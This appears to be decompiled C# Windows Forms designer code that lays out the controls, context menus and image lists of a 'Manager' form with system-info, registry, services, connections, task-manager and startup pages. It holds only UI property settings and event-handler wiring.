        this.bunifuPanel1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuPanel1.BackgroundImage");
        this.bunifuPanel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel1.BorderColor = System.Drawing.Color.FromArgb(249, 205, 11);
        this.bunifuPanel1.BorderRadius = 30;
        this.bunifuPanel1.BorderThickness = 1;
        this.bunifuPanel1.Controls.Add(this.RAM);
        this.bunifuPanel1.Controls.Add(this.guna2GradientButton_1);
        this.bunifuPanel1.Controls.Add(this.label8);
        this.bunifuPanel1.Location = new System.Drawing.Point(67, 378);
        this.bunifuPanel1.Name = "bunifuPanel1";
        this.bunifuPanel1.ShowBorders = true;
        this.bunifuPanel1.Size = new System.Drawing.Size(201, 54);
        this.bunifuPanel1.TabIndex = 596;
        this.RAM.AllowParentOverrides = false;
        this.RAM.AutoEllipsis = false;
        this.RAM.AutoSize = false;
        this.RAM.CursorType = null;
        this.RAM.Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Bold);
        this.RAM.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.RAM.Location = new System.Drawing.Point(61, 27);
        this.RAM.Name = "RAM";
        this.RAM.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.RAM.Size = new System.Drawing.Size(123, 19);
        this.RAM.TabIndex = 589;
        this.RAM.Text = "4557";
        this.RAM.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.RAM.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.guna2GradientButton_1.Animated = true;
        this.guna2GradientButton_1.AutoRoundedCorners = true;
        this.guna2GradientButton_1.BackColor = System.Drawing.Color.Transparent;
        this.guna2GradientButton_1.BorderRadius = 20;
        this.guna2GradientButton_1.CheckedState.BorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_1.CustomImages.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_1.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.guna2GradientButton_1.ForeColor = System.Drawing.SystemColors.InfoText;
        this.guna2GradientButton_1.HoverState.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Image = (System.Drawing.Image)resources.GetObject("guna2GradientButton1.Image");
        this.guna2GradientButton_1.ImageSize = new System.Drawing.Size(32, 32);
        this.guna2GradientButton_1.Location = new System.Drawing.Point(7, 5);
        this.guna2GradientButton_1.Name = "guna2GradientButton1";
        this.guna2GradientButton_1.ShadowDecoration.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Size = new System.Drawing.Size(43, 43);
        this.guna2GradientButton_1.TabIndex = 578;
        this.label8.AutoSize = true;
        this.label8.BackColor = System.Drawing.Color.Transparent;
        this.label8.Font = new System.Drawing.Font("Segoe UI Semibold", 9f, System.Drawing.FontStyle.Bold);
        this.label8.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.label8.Location = new System.Drawing.Point(56, 7);
        this.label8.Name = "label8";
        this.label8.Size = new System.Drawing.Size(84, 15);
        this.label8.TabIndex = 588;
        this.label8.Text = "Available RAM";
        this.bunifuPanel11.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel11.BackgroundColor = System.Drawing.Color.FromArgb(249, 205, 11);
        this.bunifuPanel11.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuPanel11.BackgroundImage");
        this.bunifuPanel11.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel11.BorderColor = System.Drawing.Color.FromArgb(249, 205, 11);
        this.bunifuPanel11.BorderRadius = 30;
        this.bunifuPanel11.BorderThickness = 1;
        this.bunifuPanel11.Controls.Add(this.bunifuLabel_0);
        this.bunifuPanel11.Controls.Add(this.guna2GradientButton_2);
        this.bunifuPanel11.Controls.Add(this.label6);
        this.bunifuPanel11.Location = new System.Drawing.Point(274, 378);
        this.bunifuPanel11.Name = "bunifuPanel11";
        this.bunifuPanel11.ShowBorders = true;
        this.bunifuPanel11.Size = new System.Drawing.Size(201, 54);
        this.bunifuPanel11.TabIndex = 595;
        this.bunifuLabel_0.AllowParentOverrides = false;
        this.bunifuLabel_0.AutoEllipsis = false;
        this.bunifuLabel_0.AutoSize = false;
        this.bunifuLabel_0.CursorType = null;
        this.bunifuLabel_0.Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Bold);
        this.bunifuLabel_0.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.bunifuLabel_0.Location = new System.Drawing.Point(61, 27);
        this.bunifuLabel_0.Name = "CountCPUs";
        this.bunifuLabel_0.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel_0.Size = new System.Drawing.Size(116, 19);
        this.bunifuLabel_0.TabIndex = 589;
        this.bunifuLabel_0.Text = "2";
        this.bunifuLabel_0.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel_0.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.guna2GradientButton_2.Animated = true;
        this.guna2GradientButton_2.AutoRoundedCorners = true;
        this.guna2GradientButton_2.BackColor = System.Drawing.Color.Transparent;
        this.guna2GradientButton_2.BorderRadius = 20;
        this.guna2GradientButton_2.CheckedState.BorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.CheckedState.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_2.CheckedState.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.CheckedState.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_2.CustomImages.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_2.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.guna2GradientButton_2.ForeColor = System.Drawing.SystemColors.InfoText;
        this.guna2GradientButton_2.HoverState.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Image = (System.Drawing.Image)resources.GetObject("guna2GradientButton9.Image");
        this.guna2GradientButton_2.ImageSize = new System.Drawing.Size(32, 32);
        this.guna2GradientButton_2.Location = new System.Drawing.Point(7, 5);
        this.guna2GradientButton_2.Name = "guna2GradientButton9";
        this.guna2GradientButton_2.ShadowDecoration.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Size = new System.Drawing.Size(43, 43);
        this.guna2GradientButton_2.TabIndex = 578;
        this.label6.AutoSize = true;
        this.label6.BackColor = System.Drawing.Color.Transparent;
        this.label6.Font = new System.Drawing.Font("Segoe UI Semibold", 9f, System.Drawing.FontStyle.Bold);
        this.label6.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.label6.Location = new System.Drawing.Point(56, 7);
        this.label6.Name = "label6";
        this.label6.Size = new System.Drawing.Size(121, 15);
        this.label6.TabIndex = 588;
        this.label6.Text = "Count of logical CPUs";
        this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(40, 27);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(143, 128);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox1.TabIndex = 573;
        this.pictureBox1.TabStop = false;
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(797, 600);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 599;
        this.FormResizeBox1.TargetControl = this;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 619);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(494, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -15);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(494, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 108);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 411);
        this.PanelLeft.TabIndex = 593;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(817, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 411);
        this.PanelRight.TabIndex = 591;
        this.selectedItem_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.modifyToolStripMenuItem, this.modifyBinaryDataToolStripMenuItem, this.modifyToolStripSeparator1, this.deleteToolStripMenuItem1, this.renameToolStripMenuItem1 });
        this.selectedItem_ContextMenuStrip.Name = "selectedItem_ContextMenuStrip";
        this.selectedItem_ContextMenuStrip.Size = new System.Drawing.Size(185, 98);
        this.modifyToolStripMenuItem.Enabled = false;
        this.modifyToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.modifyToolStripMenuItem.Name = "modifyToolStripMenuItem";
        this.modifyToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
        this.modifyToolStripMenuItem.Text = "Modify...";
        this.modifyToolStripMenuItem.Click += new System.EventHandler(modifyToolStripMenuItem_Click);
        this.modifyBinaryDataToolStripMenuItem.Enabled = false;
        this.modifyBinaryDataToolStripMenuItem.Name = "modifyBinaryDataToolStripMenuItem";
        this.modifyBinaryDataToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
        this.modifyBinaryDataToolStripMenuItem.Text = "Modify Binary Data...";
        this.modifyBinaryDataToolStripMenuItem.Click += new System.EventHandler(modifyBinaryDataToolStripMenuItem_Click);
        this.modifyToolStripSeparator1.Name = "modifyToolStripSeparator1";
        this.modifyToolStripSeparator1.Size = new System.Drawing.Size(181, 6);
        this.deleteToolStripMenuItem1.Name = "deleteToolStripMenuItem1";
        this.deleteToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.deleteToolStripMenuItem1.Text = "Delete";
        this.deleteToolStripMenuItem1.Click += new System.EventHandler(deleteToolStripMenuItem1_Click);
        this.renameToolStripMenuItem1.Name = "renameToolStripMenuItem1";
        this.renameToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.renameToolStripMenuItem1.Text = "Rename";
        this.renameToolStripMenuItem1.Click += new System.EventHandler(renameToolStripMenuItem1_Click);
        this.lst_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.newToolStripMenuItem1 });
        this.lst_ContextMenuStrip.Name = "lst_ContextMenuStrip";
        this.lst_ContextMenuStrip.Size = new System.Drawing.Size(99, 26);
        this.newToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.keyToolStripMenuItem1, this.toolStripSeparator4, this.stringValueToolStripMenuItem1, this.binaryValueToolStripMenuItem1, this.dWORD32bitValueToolStripMenuItem1, this.qWORD64bitValueToolStripMenuItem1, this.multiStringValueToolStripMenuItem1, this.expandableStringValueToolStripMenuItem1 });
        this.newToolStripMenuItem1.Name = "newToolStripMenuItem1";
        this.newToolStripMenuItem1.Size = new System.Drawing.Size(98, 22);
        this.newToolStripMenuItem1.Text = "New";
        this.keyToolStripMenuItem1.Name = "keyToolStripMenuItem1";
        this.keyToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.keyToolStripMenuItem1.Text = "Key";
        this.keyToolStripMenuItem1.Click += new System.EventHandler(keyToolStripMenuItem1_Click);
        this.toolStripSeparator4.Name = "toolStripSeparator4";
        this.toolStripSeparator4.Size = new System.Drawing.Size(197, 6);
        this.stringValueToolStripMenuItem1.Name = "stringValueToolStripMenuItem1";
        this.stringValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.stringValueToolStripMenuItem1.Text = "String Value";
        this.stringValueToolStripMenuItem1.Click += new System.EventHandler(stringValueToolStripMenuItem1_Click);
        this.binaryValueToolStripMenuItem1.Name = "binaryValueToolStripMenuItem1";
        this.binaryValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.binaryValueToolStripMenuItem1.Text = "Binary Value";
        this.binaryValueToolStripMenuItem1.Click += new System.EventHandler(binaryValueToolStripMenuItem1_Click);
        this.dWORD32bitValueToolStripMenuItem1.Name = "dWORD32bitValueToolStripMenuItem1";
        this.dWORD32bitValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.dWORD32bitValueToolStripMenuItem1.Text = "DWORD (32-bit) Value";
        this.dWORD32bitValueToolStripMenuItem1.Click += new System.EventHandler(dWORD32bitValueToolStripMenuItem1_Click);
        this.qWORD64bitValueToolStripMenuItem1.Name = "qWORD64bitValueToolStripMenuItem1";
        this.qWORD64bitValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.qWORD64bitValueToolStripMenuItem1.Text = "QWORD (64-bit) Value";
        this.qWORD64bitValueToolStripMenuItem1.Click += new System.EventHandler(qWORD64bitValueToolStripMenuItem1_Click);
        this.multiStringValueToolStripMenuItem1.Name = "multiStringValueToolStripMenuItem1";
        this.multiStringValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.multiStringValueToolStripMenuItem1.Text = "Multi-String Value";
        this.multiStringValueToolStripMenuItem1.Click += new System.EventHandler(multiStringValueToolStripMenuItem1_Click);
        this.expandableStringValueToolStripMenuItem1.Name = "expandableStringValueToolStripMenuItem1";
        this.expandableStringValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.expandableStringValueToolStripMenuItem1.Text = "Expandable String Value";
        this.expandableStringValueToolStripMenuItem1.Click += new System.EventHandler(expandableStringValueToolStripMenuItem1_Click);
        this.tv_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.toolStripMenuItem1, this.toolStripSeparator1, this.toolStripMenuItem2, this.toolStripMenuItem3 });
        this.tv_ContextMenuStrip.Name = "contextMenuStrip";
        this.tv_ContextMenuStrip.Size = new System.Drawing.Size(118, 76);
        this.toolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.keyToolStripMenuItem, this.toolStripSeparator2, this.stringValueToolStripMenuItem, this.binaryValueToolStripMenuItem, this.dWORD32bitValueToolStripMenuItem, this.qWORD64bitValueToolStripMenuItem, this.multiStringValueToolStripMenuItem, this.expandableStringValueToolStripMenuItem });
        this.toolStripMenuItem1.Name = "toolStripMenuItem1";
        this.toolStripMenuItem1.Size = new System.Drawing.Size(117, 22);
        this.toolStripMenuItem1.Text = "New";
        this.keyToolStripMenuItem.Name = "keyToolStripMenuItem";
        this.keyToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.keyToolStripMenuItem.Text = "Key";
        this.keyToolStripMenuItem.Click += new System.EventHandler(keyToolStripMenuItem_Click);
        this.toolStripSeparator2.Name = "toolStripSeparator2";
        this.toolStripSeparator2.Size = new System.Drawing.Size(197, 6);
        this.stringValueToolStripMenuItem.Name = "stringValueToolStripMenuItem";
        this.stringValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.stringValueToolStripMenuItem.Text = "String Value";
        this.stringValueToolStripMenuItem.Click += new System.EventHandler(stringValueToolStripMenuItem_Click);
        this.binaryValueToolStripMenuItem.Name = "binaryValueToolStripMenuItem";
        this.binaryValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.binaryValueToolStripMenuItem.Text = "Binary Value";
        this.binaryValueToolStripMenuItem.Click += new System.EventHandler(binaryValueToolStripMenuItem_Click);
        this.dWORD32bitValueToolStripMenuItem.Name = "dWORD32bitValueToolStripMenuItem";
        this.dWORD32bitValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.dWORD32bitValueToolStripMenuItem.Text = "DWORD (32-bit) Value";
        this.dWORD32bitValueToolStripMenuItem.Click += new System.EventHandler(dWORD32bitValueToolStripMenuItem_Click);
        this.qWORD64bitValueToolStripMenuItem.Name = "qWORD64bitValueToolStripMenuItem";
        this.qWORD64bitValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.qWORD64bitValueToolStripMenuItem.Text = "QWORD (64-bit) Value";
        this.qWORD64bitValueToolStripMenuItem.Click += new System.EventHandler(qWORD64bitValueToolStripMenuItem_Click);
        this.multiStringValueToolStripMenuItem.Name = "multiStringValueToolStripMenuItem";
        this.multiStringValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.multiStringValueToolStripMenuItem.Text = "Multi-String Value";
        this.multiStringValueToolStripMenuItem.Click += new System.EventHandler(multiStringValueToolStripMenuItem_Click);
        this.expandableStringValueToolStripMenuItem.Name = "expandableStringValueToolStripMenuItem";
        this.expandableStringValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.expandableStringValueToolStripMenuItem.Text = "Expandable String Value";
        this.expandableStringValueToolStripMenuItem.Click += new System.EventHandler(expandableStringValueToolStripMenuItem_Click);
        this.toolStripSeparator1.Name = "toolStripSeparator1";
        this.toolStripSeparator1.Size = new System.Drawing.Size(114, 6);
        this.toolStripMenuItem2.Name = "toolStripMenuItem2";
        this.toolStripMenuItem2.Size = new System.Drawing.Size(117, 22);
        this.toolStripMenuItem2.Text = "Delete";
        this.toolStripMenuItem2.Click += new System.EventHandler(toolStripMenuItem2_Click);
        this.toolStripMenuItem3.Name = "toolStripMenuItem3";
        this.toolStripMenuItem3.Size = new System.Drawing.Size(117, 22);
        this.toolStripMenuItem3.Text = "Rename";
        this.toolStripMenuItem3.Click += new System.EventHandler(toolStripMenuItem3_Click);
        this.ImageListServices.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageListServices.ImageStream");
        this.ImageListServices.TransparentColor = System.Drawing.Color.Transparent;
        this.ImageListServices.Images.SetKeyName(0, "False.png");
        this.ImageListServices.Images.SetKeyName(1, "True.png");
        this.imageList_0.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageListTCPConnect.ImageStream");
        this.imageList_0.TransparentColor = System.Drawing.Color.Transparent;
        this.imageList_0.Images.SetKeyName(0, "Closed.png");
        this.imageList_0.Images.SetKeyName(1, "Closeing.png");
        this.imageList_0.Images.SetKeyName(2, "Established.png");
        this.imageList_0.Images.SetKeyName(3, "Listen.png");
        this.imageList_0.Images.SetKeyName(4, "Other.png");
        this.imageList_0.Images.SetKeyName(5, "Received.png");
        this.imageList_0.Images.SetKeyName(6, "Sent.png");
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(851, 654);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "Manager";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Manager";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Manager_FormClosing);
        base.Load += new System.EventHandler(Manager_Load);
        base.Shown += new System.EventHandler(Manager_Shown);
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        this.panelForm.ResumeLayout(false);
        this.PaneControll.ResumeLayout(false);
        this.PageManager.ResumeLayout(false);
        this.PageInfo.ResumeLayout(false);
        this.Panel1.ResumeLayout(false);
        this.Panel1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListInfo).EndInit();
        this.ContexMuneInfo.ResumeLayout(false);
        this.PageInstall.ResumeLayout(false);
        this.Panel2.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListInstalled).EndInit();
        this.ContexMuneInstalled.ResumeLayout(false);
        this.PageFileManager.ResumeLayout(false);
        this.Panel3.ResumeLayout(false);
        this.PanelListFileManager.ResumeLayout(false);
        this.CountexMuneFiles.ResumeLayout(false);
        this.PanelTitleFileManager.ResumeLayout(false);
        this.PanelTitleFileManager.PerformLayout();
        this.PageRegisrty.ResumeLayout(false);
        this.Panel4.ResumeLayout(false);
        this.tableLayoutPanel.ResumeLayout(false);
        this.tableLayoutPanel.PerformLayout();
        this.splitContainer.Panel1.ResumeLayout(false);
        this.splitContainer.Panel2.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.splitContainer).EndInit();
        this.splitContainer.ResumeLayout(false);
        this.menuStrip.ResumeLayout(false);
        this.menuStrip.PerformLayout();
        this.PageServices.ResumeLayout(false);
        this.Panel5.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListServices).EndInit();
        this.ContexServices.ResumeLayout(false);
        this.PageConnect.ResumeLayout(false);
        this.Panel6.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListConnection).EndInit();
        this.ContexServices_1.ResumeLayout(false);
        this.PageTaskManager.ResumeLayout(false);
        this.Panel7.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListProcess).EndInit();
        this.contextTaskManager.ResumeLayout(false);
        this.PageCmd.ResumeLayout(false);
        this.Panel8.ResumeLayout(false);
        this.Panel8.PerformLayout();
        this.PageStartup.ResumeLayout(false);
        this.Panel9.ResumeLayout(false);
        this.ContexListStartup.ResumeLayout(false);
        this.PageDownload.ResumeLayout(false);
        this.Panel10.ResumeLayout(false);
        this.LayoutPanelDownload.ResumeLayout(false);
        this.LayoutPanelDownload.PerformLayout();
        this.PageLogs.ResumeLayout(false);
        this.Panel11.ResumeLayout(false);
        this.bunifuPanel2.ResumeLayout(false);
        this.bunifuPanel2.PerformLayout();
        this.bunifuPanel1.ResumeLayout(false);
        this.bunifuPanel1.PerformLayout();
        this.bunifuPanel11.ResumeLayout(false);
        this.bunifuPanel11.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        this.selectedItem_ContextMenuStrip.ResumeLayout(false);
        this.lst_ContextMenuStrip.ResumeLayout(false);
        this.tv_ContextMenuStrip.ResumeLayout(false);
        base.ResumeLayout(false);
    }
}
